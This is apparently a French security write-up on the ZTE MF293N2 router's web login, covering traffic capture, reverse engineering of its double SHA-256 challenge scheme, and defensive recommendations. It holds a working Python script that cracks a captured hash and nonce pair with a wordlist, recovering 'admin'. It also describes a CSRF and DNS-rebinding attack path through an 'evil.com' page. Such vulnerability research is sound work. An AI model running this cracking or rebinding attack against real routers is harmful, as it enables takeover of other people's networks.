# zte-mf293n2-auth-bypass

# Analyse du mécanisme d'authentification web du routeur ZTE MF293N2 (Airtel)

### De la capture réseau au reverse engineering du challenge-response

**Auteur :** Dan Maluma — *Offensive Security / DFIR*

| | |
|---|---|
| **Modèle** | ZTE MF293N2 |
| **Firmware** | `WEB_AIRCODMF293N2V1.0.0B02` (software_version / inner_software_version) |
| **Interface analysée** | `http://192.168.1.1` |
| **Cadre** | Test réalisé sur matériel personnel, réseau local |

---

## Sommaire

1. [Contexte et objectif](#1-contexte-et-objectif)
2. [Hypothèses de test](#2-hypothèses-de-test)
3. [Outils utilisés](#3-outils-utilisés)
4. [Phase 1 — Capture du trafic](#4-phase-1--capture-du-trafic)
5. [Phase 2 — Échec du cracking direct](#5-phase-2--échec-du-cracking-direct-invalidation-de-h2)
6. [Phase 3 — Reverse engineering du JavaScript client](#6-phase-3--reverse-engineering-du-javascript-client)
7. [Phase 4 — Rôle du challenge LD](#7-phase-4--rôle-du-challenge-ld)
8. [Phase 5 — Reconstruction et vérification](#8-phase-5--reconstruction-et-vérification-cracking-ciblé)
9. [Vecteur d'exposition distant (CSRF / DNS Rebinding)](#9-vecteur-dexposition-distant-csrf--dns-rebinding)
10. [Discussion](#10-discussion)
11. [Limite de l'étude](#11-limite-de-létude)
12. [Recommandations](#12-recommandations)

---

## 1. Contexte et objectif

Les routeurs 4G/LTE distribués par les opérateurs mobiles en marque blanche (ici un ZTE MF293N2 distribué par Airtel) exposent une interface d'administration web locale, généralement accessible sans authentification réseau préalable à toute personne connectée au Wi-Fi ou à l'Ethernet du boîtier. Cette interface permet de modifier des paramètres sensibles (SSID, clé Wi-Fi, APN, SMS). Sa sécurité repose donc entièrement sur le mécanisme de login HTTP.

L'objectif de cette analyse est de déterminer si un attaquant passif présent sur le réseau local peut, à partir d'une simple capture de trafic HTTP vers l'interface d'administration, retrouver le mot de passe administrateur du routeur.

## 2. Hypothèses de test

- **H1** : le mot de passe est transmis en clair (absence totale de protection).
- **H2** : le mot de passe est transmis sous forme d'un hash simple et standard (SHA-256 brut du mot de passe), directement cassable par dictionnaire via Hashcat (`-m 1400`) ou John (`--format=Raw-SHA256`).

Ces deux hypothèses seront invalidées successivement, ce qui constitue en soi un résultat utile de la démarche.

## 3. Outils utilisés

| Outil | Rôle |
|---|---|
| Wireshark / Pcredz | Capture et extraction de credentials réseau |
| Firefox (Inspecteur/Débogueur) | Analyse du JavaScript client exécuté par le navigateur |
| `curl` | Extraction manuelle des fichiers JS servis par le routeur |
| Python 3 (`hashlib`) | Vérification et reconstruction de l'algorithme de hash |
| John the Ripper / Hashcat | Cracking direct, puis cracking ciblé une fois l'algorithme identifié |
| `rockyou.txt` | Dictionnaire de mots de passe |

## 4. Phase 1 — Capture du trafic

Une capture passive (Wireshark) a été réalisée pendant une session complète de connexion à l'interface web du routeur, depuis le chargement de la page de login jusqu'à l'authentification réussie.

L'analyse du flux HTTP (port 80, en clair) montre une séquence de deux requêtes essentielles :

```http
GET /goform/goform_get_cmd_process?isTest=false&cmd=LD HTTP/1.1
```

Réponse :

```json
{"LD":"7723D091009DBDEF9E4CCE296B59B89D74A5B8C022E69DD9BFA2E535D66233E1"}
```

```http
POST /goform/goform_set_cmd_process HTTP/1.1
Content-Type: application/x-www-form-urlencoded

isTest=false&goformId=LOGIN&password=4B3BB87A668EB32CF299055C6E46C33750EE36C890AF186061114CF07934481A
```

Le champ `password` transmis fait 64 caractères hexadécimaux — longueur caractéristique d'une sortie SHA-256. Ceci invalide d'emblée **H1** : le mot de passe n'est pas transmis en clair.

L'outil **Pcredz**, lors de l'extraction automatique de ce champ, le signale comme un hash potentiellement exploitable mais mal formé (*"bad hash"*) : son moteur de détection reconnaît la structure NTLM / HTTP-Basic / Digest standard, mais pas ce format propriétaire — ce qui a orienté la suite de l'analyse vers l'hypothèse d'un hash non-standard plutôt que vers une corruption de capture (vérifiée par ailleurs : `Content-Length` HTTP cohérent avec la taille réelle du corps, flux TCP sans retransmission).

![Extraction Pcredz, challenge LD et script crack.py](images/fig1-pcredz-ld-crackpy.jpeg)
*Figure 1 — Extraction Pcredz du flux de login (hash 64 hex), confirmation du challenge LD via `strings`, et script `crack.py`.*

## 5. Phase 2 — Échec du cracking direct (invalidation de H2)

```bash
john --format=Raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hashmav5.txt
# 0g 0:00:00:02 DONE (2026-11-05 13:16) 0g/s 5926Kp/s 5926Kc/s 5926KC/s
# Session completed.
```

![John the Ripper - 0 résultat sur rockyou.txt](images/fig2-john-raw-sha256.jpeg)
*Figure 2 — Exécution de John the Ripper (`Raw-SHA256`) : 0 mot de passe trouvé après parcours complet de `rockyou.txt`.*

```bash
hashcat -m 1400 hashmav5.txt /usr/share/wordlists/rockyou.txt
# Hash.Mode.......: 1400 (SHA2-256)
# Status..........: Exhausted
# Recovered.......: 0/1 (0.00%) Digests (total)
# Progress........: 14344390/14344390 (100.00%)
```

![Hashcat mode 1400 - Exhausted, 0 recovered](images/fig3-hashcat-m1400.jpeg)
*Figure 3 — Exécution de Hashcat (mode 1400, SHA2-256) : statut `Exhausted`, 0/1 digest récupéré après parcours complet du dictionnaire.*

Les deux outils parcourent l'intégralité du dictionnaire sans succès. Ce résultat négatif est significatif : il démontre que le hash capturé n'est **pas** un `SHA256(mot_de_passe)` simple, et invalide **H2**. Une étape de reverse engineering du mécanisme côté client devient nécessaire.

## 6. Phase 3 — Reverse engineering du JavaScript client

L'interface web repose sur un chargeur RequireJS (`js/main.js`, référencé via `data-main="js/main"` dans `index.html`). Ce fichier ne contient pas la logique de login : il se contente de définir les chemins des modules AMD.

Le module effectivement responsable de l'authentification est `js/service.js`, récupéré directement et sans authentification via :

```bash
curl -s http://192.168.1.1/js/service.js
```

L'analyse (minifiée, mais lisible après recherche ciblée des chaînes `"LOGIN"` et `password`) révèle la fonction suivante :

```js
function _e(){
  function e(e,t){
    var r = ar({nv:"LD"}).LD;
    return {
      isTest: kr,
      goformId: "LOGIN",
      password: "2"==n.WEB_ATTR_IF_SUPPORT_SHA256
        ? paswordAlgorithmsCookie(paswordAlgorithmsCookie(e.password)+r)
        : "1"==n.WEB_ATTR_IF_SUPPORT_SHA256
          ? paswordAlgorithmsCookie(Base64.encode(e.password))
          : Base64.encode(e.password)
    }
  }
}
```

Traduction de la branche active sur ce firmware (`WEB_ATTR_IF_SUPPORT_SHA256 == "2"`) :

```
password_envoyé = SHA256( SHA256(mot_de_passe) + LD )
```

où `paswordAlgorithmsCookie` est le nom donné en interne par ZTE à sa fonction wrapper SHA-256. Point important : cet algorithme est **entièrement exposé côté client**, sans secret serveur — il est donc intégralement reconstructible par toute personne capable d'inspecter le trafic HTTP non chiffré, sans nécessiter d'accès privilégié au routeur.

## 7. Phase 4 — Rôle du challenge LD

Le paramètre `LD` est un nonce (challenge) généré par le routeur et récupéré via `GET cmd=LD` avant chaque tentative de login. Il varie à chaque session, ce qui a deux conséquences :

- Deux sessions de login avec le même mot de passe produisent deux hashes `password` différents (vérifié sur deux captures distinctes : `mav2` → hash `9DC14B...` / LD `C23560...` ; `mav5` → hash `4B3BB8...` / LD `7723D0...`).
- La paire `(hash, LD)` doit impérativement être conservée **ensemble** lors de l'exfiltration : le hash seul, sans le LD associé à sa session, est inutilisable pour une vérification ou un cracking ciblé.

Ce mécanisme constitue une protection effective contre le rejeu brut d'un hash intercepté sur une session antérieure, mais ne protège pas contre une attaque par dictionnaire une fois l'algorithme et la paire `(hash, LD)` connus.

## 8. Phase 5 — Reconstruction et vérification (cracking ciblé)

Script de vérification :

```python
import hashlib

LD = "7723D091009DBDEF9E4CCE296B59B89D74A5B8C022E69DD9BFA2E535D66233E1"
cible = "4B3BB87A668EB32CF299055C6E46C33750EE36C890AF186061114CF07934481A"

# On teste les 4 variantes de casse, au cas où le JS lower-case
def test(pwd):
    for h1 in [hashlib.sha256(pwd.encode()).hexdigest(),
               hashlib.sha256(pwd.encode()).hexdigest().upper()]:
        for ld in [LD, LD.lower()]:
            h2 = hashlib.sha256((h1 + ld).encode()).hexdigest().upper()
            if h2 == cible:
                return True
    return False

with open("/usr/share/wordlists/rockyou.txt", errors="ignore") as f:
    for line in f:
        pwd = line.strip()
        if test(pwd):
            print("TROUVÉ :", pwd)
            break
    else:
        print("Pas dans rockyou avec ce LD")
```

Un premier test de vérification (`save.py`) ne testait qu'une seule combinaison de casse (`h1` minuscule + `LD` majuscule) et retournait systématiquement `False`, y compris pour le bon mot de passe.

Point méthodologique central : la casse hexadécimale n'est pas garantie identique entre l'implémentation JavaScript côté client (qui peut produire du hex en majuscules) et l'implémentation Python de vérification (`hashlib` produit du hex en minuscules par défaut). Un script de cracking rigoureux (`crack.py`) doit donc tester les **quatre combinaisons de casse possibles** : `h1` minuscule/majuscule combiné à `LD` minuscule/majuscule.

![crack.py - résultat TROUVÉ : admin](images/fig4-crack-found-admin.jpeg)
*Figure 4 — Script `crack.py` testant les 4 variantes de casse contre `rockyou.txt` : résultat `TROUVÉ : admin`.*

En testant ces quatre variantes contre `rockyou.txt`, le script a identifié le mot de passe :

```
TROUVÉ : admin
```

## 9. Vecteur d'exposition distant (CSRF / DNS Rebinding)

L'interface étant sur une IP privée (`192.168.1.1`, plage RFC 1918), elle n'est **pas routable depuis Internet** par défaut. Un attaquant purement distant peut néanmoins l'atteindre via plusieurs chemins :

1. **Exposition WAN directe** — redirection de port, DMZ, ou service de gestion distante activé par l'ISP.
2. **UPnP** — une application malveillante sur un appareil du LAN ouvre elle-même un port WAN→LAN vers l'interface admin.
3. **CSRF + DNS Rebinding** — le chemin le plus pertinent ici compte tenu de l'API analysée :
   - L'attaquant héberge une page sur un domaine qu'il contrôle (`evil.com`).
   - La victime (connectée au Wi-Fi du routeur) visite cette page ; le premier lookup DNS résout vers l'IP de l'attaquant (Same-Origin Policy satisfaite).
   - Le TTL DNS expire volontairement très vite ; au fetch suivant depuis la même page, la réponse DNS pointe vers `192.168.1.1`. Le navigateur considère toujours qu'il s'agit de la même origine (`evil.com`), donc les requêtes `fetch()` passent — mais atterrissent physiquement sur le routeur.
   - Le script malveillant rejoue alors `GET cmd=LD` puis `POST goform_set_cmd_process` avec l'algorithme reversé en section 6.

**Preuve observée dans la capture :** la requête `POST goform_set_cmd_process` ne contient **aucun champ anti-CSRF** — uniquement `Cookie: zsidn=...` et un header `Referer` (contrôle faible, contournable). Si l'API ne valide que la présence du cookie de session, un DNS Rebinding seul suffit à rejouer des actions admin sans même reconstituer le mot de passe.

## 10. Discussion

Le routeur ZTE MF293N2 (firmware `WEB_AIRCODMF293N2V1.0.0B02`) n'utilise ni une transmission en clair, ni un hash simple du mot de passe, mais un schéma de double hachage SHA-256 salé par un challenge de session (`LD`). Ce mécanisme :

- **Protège** contre le rejeu trivial d'une capture antérieure et contre un cracking automatisé par des outils standards ignorant ce format propriétaire (explique le *"bad hash"* initialement signalé par Pcredz).
- **Ne protège pas** contre une attaque hors-ligne par dictionnaire, dès lors que l'attaquant a capturé la paire `(hash, LD)` et reconstruit l'algorithme — ce qui ne requiert qu'une analyse passive du trafic HTTP et du JavaScript servi publiquement, sans aucun accès privilégié.
- **Ne protège pas** contre un rejeu d'action admin via CSRF/DNS Rebinding, faute de token anti-CSRF dédié (section 9).
- Reste in fine dépendant de la robustesse du mot de passe : dans le cas étudié, le mot de passe par défaut `admin` a été retrouvé en quelques secondes avec `rockyou.txt`, rendant la complexité cryptographique de l'algorithme sans effet pratique.

## 11. Limite de l'étude

Une seule paire `(hash, LD)` a été capturée par session analysée. L'algorithme étant identifié avec certitude dans le code JavaScript source (section 6), la méthode de cracking est considérée fiable et généralisable ; toutefois, l'entropie et l'éventuelle prévisibilité ou réutilisation du nonce `LD` sur des captures répétées n'ont pas été testées à ce stade et restent à confirmer.

## 12. Recommandations

1. Changer immédiatement le mot de passe administrateur par défaut (`admin`).
2. Utiliser un mot de passe long, non présent dans les dictionnaires usuels (`rockyou.txt` et équivalents).
3. Activer HTTPS pour l'interface d'administration si le firmware le permet.
4. Éviter toute connexion à l'interface d'administration via HTTP sur un réseau partagé ou non maîtrisé.
5. Implémenter un token CSRF synchronisé côté serveur pour `goform_set_cmd_process` (le cookie de session seul ne suffit pas).
6. Valider strictement le header `Host` côté routeur pour se prémunir du DNS Rebinding.
7. *(Fabricant)* Migrer vers une authentification côté serveur avec dérivation de clé (PBKDF2/Argon2) plutôt qu'un schéma de hachage entièrement reconstructible côté client.

---

*Rapport technique — usage interne / publication personnelle.*
